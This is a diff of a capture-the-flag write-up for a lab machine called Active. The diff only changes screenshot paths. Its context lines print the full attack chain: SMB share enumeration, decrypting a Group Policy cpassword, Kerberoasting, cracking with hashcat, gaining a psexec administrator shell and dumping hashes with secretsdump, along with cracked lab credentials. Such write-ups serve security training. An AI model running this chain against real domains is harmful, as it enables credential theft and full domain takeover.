@@ -47,7 +47,7 @@ Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r
 smbclient -N -L //active.htb
 ```
 
-![](evidence/screenshots/20220805025658.png)  
+![](./20220805025658.png)  
 
 We've got a few shares we have access to. Let's look into `Replication`.
 
@@ -55,23 +55,23 @@ We've got a few shares we have access to. Let's look into `Replication`.
 smbclient -N //active.htb/replication
 ```
 
-![](evidence/screenshots/20220805025751.png)  
+![](./20220805025751.png)  
 
 ### Group Policy
 
 Inside the `active.htb` directory there is a `Policies` directory which indicates to me that this might have to do with Group Policies. If we're able to find a `Groups.xml` file, we can extract hashes to crack.
 
-![](evidence/screenshots/20220805025955.png)  
+![](./20220805025955.png)  
 
 There is a `cpassword` and `userName` field. We can crack the `cpassword` value using `gpp-decrypt`.
 
-![](evidence/screenshots/20220805030036.png)  
+![](./20220805030036.png)  
 
 ```bash
 gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
 ```
 
-![](evidence/screenshots/20220805030134.png)  
+![](./20220805030134.png)  
 
 ```text
 svc_tgs:GPPstillStandingStrong2k18
@@ -87,7 +87,7 @@ The username would hint me towards the ticket granting server and user SPN's.
 impacket-GetUserSPNs -request active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip active.htb -outputfile administrator.kerbroast
 ```
 
-![](evidence/screenshots/20220805030328.png)  
+![](./20220805030328.png)  
 
 We can now crack it offline using `hashcat`.
 
@@ -95,7 +95,7 @@ We can now crack it offline using `hashcat`.
 hashcat -m 13100 -a 0 administrator.kerbroast /usr/share/wordlists/rockyou.txt --force
 ```
 
-![](evidence/screenshots/20220805030524.png)  
+![](./20220805030524.png)  
 
 ```text
 Administrator:Ticketmaster1968
@@ -107,7 +107,7 @@ We can use `psexec` to get a shell.
 rlwrap impacket-psexec active.htb/Administrator:Ticketmaster1968@active.htb
 ```
 
-![](evidence/screenshots/20220805030752.png)  
+![](./20220805030752.png)  
 
 ### User.txt
 
@@ -115,7 +115,7 @@ rlwrap impacket-psexec active.htb/Administrator:Ticketmaster1968@active.htb
 type user.txt && ipconfig
 ```
 
-![](evidence/screenshots/20220805031050.png)  
+![](./20220805031050.png)  
 
 ### Root.txt
 
@@ -123,7 +123,7 @@ type user.txt && ipconfig
 type root.txt && ipconfig
 ```
 
-![](evidence/screenshots/20220805030938.png)  
+![](./20220805030938.png)  
 
 ## Post Exploitation
 
@@ -131,4 +131,4 @@ type root.txt && ipconfig
 impacket-secretsdump 'active.htb/Administrator:Ticketmaster1968@active.htb' -outputfile hashes
 ```
 
-![](evidence/screenshots/20220805030906.png)  
+![](./20220805030906.png)  
